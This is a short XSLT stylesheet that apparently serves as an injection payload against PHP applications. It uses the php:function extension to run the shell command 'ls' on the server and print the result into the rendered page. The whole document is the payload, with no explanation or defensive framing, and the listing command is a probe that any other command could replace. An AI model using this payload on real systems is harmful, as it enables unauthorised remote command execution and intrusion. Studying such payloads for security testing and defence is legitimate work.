<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:template match="/">
  <p>
    <xsl:value-of select="php:function('ls')" />
  </p>
</xsl:template>
</body>
</html> 
